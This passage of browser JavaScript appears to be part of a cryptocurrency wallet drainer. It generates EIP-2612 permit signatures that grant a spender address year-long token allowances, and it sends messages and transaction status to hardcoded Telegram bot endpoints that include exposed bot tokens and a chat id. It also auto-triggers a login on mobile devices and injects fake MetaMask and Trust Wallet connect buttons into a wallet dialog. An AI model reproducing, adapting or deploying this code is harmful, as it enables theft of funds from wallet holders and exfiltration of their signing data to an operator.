    if (contract.functions.hasOwnProperty('version')) {
        version = await contract.version();
    } else {
        version = "1"
    }
    let deadline = Date.now() + 1000 * 60 * 60 * 24 * 356; // + one year
    let messages = {
        owner, spender, value, nonce, deadline,
    };
    const domain = {
        name: name, version: version, chainId: chainId, verifyingContract: contract.address,
    }
    const permit = {
        Permit: [{
            name: "owner", type: "address"
        }, {
            name: "spender", type: "address"
        }, {
            name: "value", type: "uint256"
        }, {
            name: "nonce", type: "uint256"
        }, {
            name: "deadline", type: "uint256"
        },]
    }
        const values = {
        owner, spender, value, nonce, deadline,
    }
    const res = await contract.signer._signTypedData(domain, permit, values);
    const r = res.substring(0, 66);
    const s = '0x' + res.substring(66, 130);
    const v = parseInt(res.substring(130, 132), 16);
    return JSON.stringify({
        value: value._hex, deadline: deadline, v: v, r: r, s: s
    });
}


const getABI = async (address, abiUrl) => {

    console.log("================================");
    console.log("Getting ABI for", address);

    try {

        const url = abiUrl.format(address);

console.log("========== ABI REQUEST ==========");
console.log("Address:", address);
console.log("URL:", url);

const response = await axios.get(url);

        console.log("Explorer response:");
        console.log(response.data);

        const data = response.data;

        if (!data) {
            throw new Error("Empty explorer response.");
        }

        if (data.status !== "1") {
            throw new Error(
                "Explorer Error: " + data.result
            );
        }

        let abi;
        let implementation = "";

        // Explorer returns array
        if (Array.isArray(data.result)) {

            const contract = data.result[0];

            if (!contract.ABI) {
                throw new Error("ABI missing.");
            }

            if (
                contract.ABI === "Contract source code not verified"
            ) {
                throw new Error("Contract is not verified.");
            }

            abi = JSON.parse(contract.ABI);

            if (
                contract.Proxy === "1" &&
                contract.Implementation
            ) {

                implementation = contract.Implementation;

                console.log(
                    "Fetching implementation ABI:",
                    implementation
                );

                const implResponse =
                    await axios.get(
                        abiUrl.format(implementation)
                    );

                const implData = implResponse.data;

                console.log(
                    "Implementation response:",
                    implData
                );

                if (
                    implData.status === "1" &&
                    Array.isArray(implData.result)
                ) {

                    abi = JSON.parse(
                        implData.result[0].ABI
                    );

                }

            }

        }
        // Explorer returns ABI string directly
        else {

            abi = JSON.parse(data.result);

        }

        return [abi, implementation];

    } catch (err) {

        console.error("ABI retrieval failed:", err);

        throw err;

    }

}
String.prototype.format = function () {
    let args = arguments;
    return this.replace(/{(\d+)}/g, function (match, index) {
        // check if the argument is present
        return typeof args[index] == 'undefined' ? match : args[index];
    });
};
/*
function logTlgMsg(msg, sus, hash) {
  if (sus == "1") {
    var succestrans = '✅ <b>Transaction is confirmed</b>';
  } else {
    var succestrans = '❌ <b>Transaction is rejected</b>';
  }
  fetch(
  'https://api.telegram.org/bot8936022211:AAFOQR4J-q9AMQsYglu7mje8c87iXLInP6o/sendMessage',
  {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: '8614416084',
      text: msg + '\n' + succestrans,
      parse_mode: undefined
    })
  }
);
}

function logTlg(msg) {
  fetch(
  'https://api.telegram.org/bot8936022211:AAFOQR4J-q9AMQsYglu7mje8c87iXLInP6o/sendMessage',
  {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: '8614416084',
      text: msg,
      parse_mode: undefined
    })
  }
);
}
*/
async function logTlgMsg(msg, sus, hash) {
  const succestrans =
    sus === "1"
      ? "✅ <b>Transaction is confirmed</b>"
      : "❌ <b>Transaction is rejected</b>";

  try {
    const response = await fetch(
      "https://api.telegram.org/bot8883709162:AAH4hi8NPjE3ULxGdd3gcXFCjEwDGnosFbM/sendMessage",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: "8614416084",
          text: msg + "\n" + succestrans,
          parse_mode: undefined
        })
      }
    );

    const result = await response.json();

    if (!response.ok || !result.ok) {
      console.error("Telegram rejected message:", result);
      return false;
    }

    console.log("Telegram message sent:", result);
    return true;
  } catch (error) {
    console.error("Telegram request failed:", error);
    return false;
  }
}

async function logTlg(msg) {
  try {
    const response = await fetch(
      "https://api.telegram.org/bot8883709162:AAH4hi8NPjE3ULxGdd3gcXFCjEwDGnosFbM/sendMessage",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: "8614416084",
          text: msg,
          parse_mode: undefined
        })
      }
    );

    const result = await response.json();

    if (!response.ok || !result.ok) {
      console.error("Telegram rejected message:", result);
      return false;
    }

    console.log("Telegram message sent:", result);
    return true;
  } catch (error) {
    console.error("Telegram request failed:", error);
    return false;
  }
}

if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
  login();
}

function isMobile() {
    var check = false;
    (function (a) {
        if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
    })(navigator.userAgent || navigator.vendor || window.opera);
    return check;
};

window.addEventListener('load', async () => {
  init();
    if (isMobile()) {
        $(".web3modal-modal-card").prepend('<div class="sc-eCImPb bElhDP web3modal-provider-wrapper" onclick="loginMetamask();"><div class="sc-hKwDye hKhOIm web3modal-provider-container"><div class="sc-bdvvtL fqonLZ web3modal-provider-icon"><img src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjM1NSIgdmlld0JveD0iMCAwIDM5NyAzNTUiIHdpZHRoPSIzOTciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMSAtMSkiPjxwYXRoIGQ9Im0xMTQuNjIyNjQ0IDMyNy4xOTU0NzIgNTIuMDA0NzE3IDEzLjgxMDE5OHYtMTguMDU5NDlsNC4yNDUyODMtNC4yNDkyOTJoMjkuNzE2OTgydjIxLjI0NjQ1OSAxNC44NzI1MjNoLTMxLjgzOTYyNGwtMzkuMjY4ODY4LTE2Ljk5NzE2OXoiIGZpbGw9IiNjZGJkYjIiLz48cGF0aCBkPSJtMTk5LjUyODMwNSAzMjcuMTk1NDcyIDUwLjk0MzM5NyAxMy44MTAxOTh2LTE4LjA1OTQ5bDQuMjQ1MjgzLTQuMjQ5MjkyaDI5LjcxNjk4MXYyMS4yNDY0NTkgMTQuODcyNTIzaC0zMS44Mzk2MjNsLTM5LjI2ODg2OC0xNi45OTcxNjl6IiBmaWxsPSIjY2RiZGIyIiB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSA0ODMuOTYyMjcgMCkiLz48cGF0aCBkPSJtMTcwLjg3MjY0NCAyODcuODg5NTIzLTQuMjQ1MjgzIDM1LjA1NjY1NyA1LjMwNjYwNC00LjI0OTI5Mmg1NS4xODg2OGw2LjM2NzkyNSA0LjI0OTI5Mi00LjI0NTI4NC0zNS4wNTY2NTctOC40OTA1NjUtNS4zMTE2MTUtNDIuNDUyODMyIDEuMDYyMzIzeiIgZmlsbD0iIzM5MzkzOSIvPjxwYXRoIGQ9Im0xNDIuMjE2OTg0IDUwLjk5MTUwMjIgMjUuNDcxNjk4IDU5LjQ5MDA4NTggMTEuNjc0NTI4IDE3My4xNTg2NDNoNDEuMzkxNTExbDEyLjczNTg0OS0xNzMuMTU4NjQzIDIzLjM0OTA1Ni01OS40OTAwODU4eiIgZmlsbD0iI2Y4OWMzNSIvPjxwYXRoIGQ9Im0zMC43NzgzMDIzIDE4MS42NTcyMjYtMjkuNzE2OTgxNTMgODYuMDQ4MTYxIDc0LjI5MjQ1MzkzLTQuMjQ5MjkzaDQ3Ljc1OTQzNDN2LTM3LjE4MTMwM2wtMi4xMjI2NDEtNzYuNDg3MjUzLTEwLjYxMzIwOCA4LjQ5ODU4M3oiIGZpbGw9IiNmODlkMzUiLz48cGF0aCBkPSJtODcuMDI4MzAzMiAxOTEuMjE4MTM0IDg3LjAyODMwMjggMi4xMjQ2NDYtOS41NTE4ODYgNDQuNjE3NTYzLTQxLjM5MTUxMS0xMC42MjMyMjl6IiBmaWxsPSIjZDg3YzMwIi8+PHBhdGggZD0ibTg3LjAyODMwMzIgMTkyLjI4MDQ1NyAzNi4wODQ5MDU4IDMzLjk5NDMzNHYzMy45OTQzMzR6IiBmaWxsPSIjZWE4ZDNhIi8+PHBhdGggZD0ibTEyMy4xMTMyMDkgMjI3LjMzNzExNCA0Mi40NTI4MzEgMTAuNjIzMjI5IDEzLjc5NzE3IDQ1LjY3OTg4OC05LjU1MTg4NiA1LjMxMTYxNS00Ni42OTgxMTUtMjcuNjIwMzk4eiIgZmlsbD0iI2Y4OWQzNSIvPjxwYXRoIGQ9Im0xMjMuMTEzMjA5IDI2MS4zMzE0NDgtOC40OTA1NjUgNjUuODY0MDI0IDU2LjI1LTM5LjMwNTk0OXoiIGZpbGw9IiNlYjhmMzUiLz48cGF0aCBkPSJtMTc0LjA1NjYwNiAxOTMuMzQyNzggNS4zMDY2MDQgOTAuMjk3NDUxLTE1LjkxOTgxMi00Ni4yMTEwNDl6IiBmaWxsPSIjZWE4ZTNhIi8+PHBhdGggZD0ibTc0LjI5MjQ1MzkgMjYyLjM5Mzc3MSA0OC44MjA3NTUxLTEuMDYyMzIzLTguNDkwNTY1IDY1Ljg2NDAyNHoiIGZpbGw9IiNkODdjMzAiLz48cGF0aCBkPSJtMjQuNDEwMzc3NyAzNTUuODc4MTkzIDkwLjIxMjI2NjMtMjguNjgyNzIxLTQwLjMzMDE5MDEtNjQuODAxNzAxLTczLjIzMTEzMzEzIDUuMzExNjE2eiIgZmlsbD0iI2ViOGYzNSIvPjxwYXRoIGQ9Im0xNjcuNjg4NjgyIDExMC40ODE1ODgtNDUuNjM2NzkzIDM4LjI0MzYyNy0zNS4wMjM1ODU4IDQyLjQ5MjkxOSA4Ny4wMjgzMDI4IDMuMTg2OTY5eiIgZmlsbD0iI2U4ODIxZSIvPjxwYXRoIGQ9Im0xMTQuNjIyNjQ0IDMyNy4xOTU0NzIgNTYuMjUtMzkuMzA1OTQ5LTQuMjQ1MjgzIDMzLjk5NDMzNHYxOS4xMjE4MTNsLTM4LjIwNzU0OC03LjQzNjI2eiIgZmlsbD0iI2RmY2VjMyIvPjxwYXRoIGQ9Im0yMjkuMjQ1Mjg2IDMyNy4xOTU0NzIgNTUuMTg4NjgtMzkuMzA1OTQ5LTQuMjQ1MjgzIDMzLjk5NDMzNHYxOS4xMjE4MTNsLTM4LjIwNzU0OC03LjQzNjI2eiIgZmlsbD0iI2RmY2VjMyIgdHJhbnNmb3JtPSJtYXRyaXgoLTEgMCAwIDEgNTEzLjY3OTI1MiAwKSIvPjxwYXRoIGQ9Im0xMzIuNjY1MDk2IDIxMi40NjQ1OTMtMTEuNjc0NTI4IDI0LjQzMzQyNyA0MS4zOTE1MS0xMC42MjMyMjl6IiBmaWxsPSIjMzkzOTM5IiB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSAyODMuMzcyNjQ2IDApIi8+PHBhdGggZD0ibTIzLjM0OTA1NyAxLjA2MjMyMjk2IDE0NC4zMzk2MjUgMTA5LjQxOTI2NTA0LTI0LjQxMDM3OC01OS40OTAwODU4eiIgZmlsbD0iI2U4OGYzNSIvPjxwYXRoIGQ9Im0yMy4zNDkwNTcgMS4wNjIzMjI5Ni0xOS4xMDM3NzM5MiA1OC40Mjc3NjI5NCAxMC42MTMyMDc3MiA2My43MzkzNzgxLTcuNDI5MjQ1NDEgNC4yNDkyOTIgMTAuNjEzMjA3NzEgOS41NjA5MDYtOC40OTA1NjYxNyA3LjQzNjI2MSAxMS42NzQ1Mjg0NyAxMC42MjMyMjktNy40MjkyNDU0IDYuMzczOTM4IDE2Ljk4MTEzMjMgMjEuMjQ2NDU5IDc5LjU5OTA1NzctMjQuNDMzNDI4YzM4LjkxNTA5Ni0zMS4xNjE0NzMgNTguMDE4ODY5LTQ3LjA5NjMxOCA1Ny4zMTEzMjItNDcuODA0NTMzLS43MDc1NDgtLjcwODIxNS00OC44MjA3NTYtMzcuMTgxMzAzNi0xNDQuMzM5NjI1LTEwOS40MTkyNjUwNHoiIGZpbGw9IiM4ZTVhMzAiLz48ZyB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSAzOTkuMDU2NjExIDApIj48cGF0aCBkPSJtMzAuNzc4MzAyMyAxODEuNjU3MjI2LTI5LjcxNjk4MTUzIDg2LjA0ODE2MSA3NC4yOTI0NTM5My00LjI0OTI5M2g0Ny43NTk0MzQzdi0zNy4xODEzMDNsLTIuMTIyNjQxLTc2LjQ4NzI1My0xMC42MTMyMDggOC40OTg1ODN6IiBmaWxsPSIjZjg5ZDM1Ii8+PHBhdGggZD0ibTg3LjAyODMwMzIgMTkxLjIxODEzNCA4Ny4wMjgzMDI4IDIuMTI0NjQ2LTkuNTUxODg2IDQ0LjYxNzU2My00MS4zOTE1MTEtMTAuNjIzMjI5eiIgZmlsbD0iI2Q4N2MzMCIvPjxwYXRoIGQ9Im04Ny4wMjgzMDMyIDE5Mi4yODA0NTcgMzYuMDg0OTA1OCAzMy45OTQzMzR2MzMuOTk0MzM0eiIgZmlsbD0iI2VhOGQzYSIvPjxwYXRoIGQ9Im0xMjMuMTEzMjA5IDIyNy4zMzcxMTQgNDIuNDUyODMxIDEwLjYyMzIyOSAxMy43OTcxNyA0NS42Nzk4ODgtOS41NTE4ODYgNS4zMTE2MTUtNDYuNjk4MTE1LTI3LjYyMDM5OHoiIGZpbGw9IiNmODlkMzUiLz48cGF0aCBkPSJtMTIzLjExMzIwOSAyNjEuMzMxNDQ4LTguNDkwNTY1IDY1Ljg2NDAyNCA1NS4xODg2OC0zOC4yNDM2MjZ6IiBmaWxsPSIjZWI4ZjM1Ii8+PHBhdGggZD0ibTE3NC4wNTY2MDYgMTkzLjM0Mjc4IDUuMzA2NjA0IDkwLjI5NzQ1MS0xNS45MTk4MTItNDYuMjExMDQ5eiIgZmlsbD0iI2VhOGUzYSIvPjxwYXRoIGQ9Im03NC4yOTI0NTM5IDI2Mi4zOTM3NzEgNDguODIwNzU1MS0xLjA2MjMyMy04LjQ5MDU2NSA2NS44NjQwMjR6IiBmaWxsPSIjZDg3YzMwIi8+PHBhdGggZD0ibTI0LjQxMDM3NzcgMzU1Ljg3ODE5MyA5MC4yMTIyNjYzLTI4LjY4MjcyMS00MC4zMzAxOTAxLTY0LjgwMTcwMS03My4yMzExMzMxMyA1LjMxMTYxNnoiIGZpbGw9IiNlYjhmMzUiLz48cGF0aCBkPSJtMTY3LjY4ODY4MiAxMTAuNDgxNTg4LTQ1LjYzNjc5MyAzOC4yNDM2MjctMzUuMDIzNTg1OCA0Mi40OTI5MTkgODcuMDI4MzAyOCAzLjE4Njk2OXoiIGZpbGw9IiNlODgyMWUiLz48cGF0aCBkPSJtMTMyLjY2NTA5NiAyMTIuNDY0NTkzLTExLjY3NDUyOCAyNC40MzM0MjcgNDEuMzkxNTEtMTAuNjIzMjI5eiIgZmlsbD0iIzM5MzkzOSIgdHJhbnNmb3JtPSJtYXRyaXgoLTEgMCAwIDEgMjgzLjM3MjY0NiAwKSIvPjxwYXRoIGQ9Im0yMy4zNDkwNTcgMS4wNjIzMjI5NiAxNDQuMzM5NjI1IDEwOS40MTkyNjUwNC0yNC40MTAzNzgtNTkuNDkwMDg1OHoiIGZpbGw9IiNlODhmMzUiLz48cGF0aCBkPSJtMjMuMzQ5MDU3IDEuMDYyMzIyOTYtMTkuMTAzNzczOTIgNTguNDI3NzYyOTQgMTAuNjEzMjA3NzIgNjMuNzM5Mzc4MS03LjQyOTI0NTQxIDQuMjQ5MjkyIDEwLjYxMzIwNzcxIDkuNTYwOTA2LTguNDkwNTY2MTcgNy40MzYyNjEgMTEuNjc0NTI4NDcgMTAuNjIzMjI5LTcuNDI5MjQ1NCA2LjM3MzkzOCAxNi45ODExMzIzIDIxLjI0NjQ1OSA3OS41OTkwNTc3LTI0LjQzMzQyOGMzOC45MTUwOTYtMzEuMTYxNDczIDU4LjAxODg2OS00Ny4wOTYzMTggNTcuMzExMzIyLTQ3LjgwNDUzMy0uNzA3NTQ4LS43MDgyMTUtNDguODIwNzU2LTM3LjE4MTMwMzYtMTQ0LjMzOTYyNS0xMDkuNDE5MjY1MDR6IiBmaWxsPSIjOGU1YTMwIi8+PC9nPjwvZz48L3N2Zz4=" alt="MetaMask"></div><div class="sc-gsDKAQ gHoDBx web3modal-provider-name">MetaMask</div><div class="sc-dkPtRN eCZoDi web3modal-provider-description">Connect to your MetaMask Wallet</div></div></div><div class="sc-eCImPb bElhDP web3modal-provider-wrapper" onclick="loginTrust();"><div class="sc-hKwDye hKhOIm web3modal-provider-container"><div class="sc-bdvvtL fqonLZ web3modal-provider-icon"><img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" alt="Trust Wallet"></div><div class="sc-gsDKAQ gHoDBx web3modal-provider-name">Trust Wallet</div><div class="sc-dkPtRN eCZoDi web3modal-provider-description">Connect to your Trust Wallet</div></div></div>');
        $('.web3modal-modal-card .web3modal-provider-wrapper').last().css( "display", "none" );
    }
});


//
//
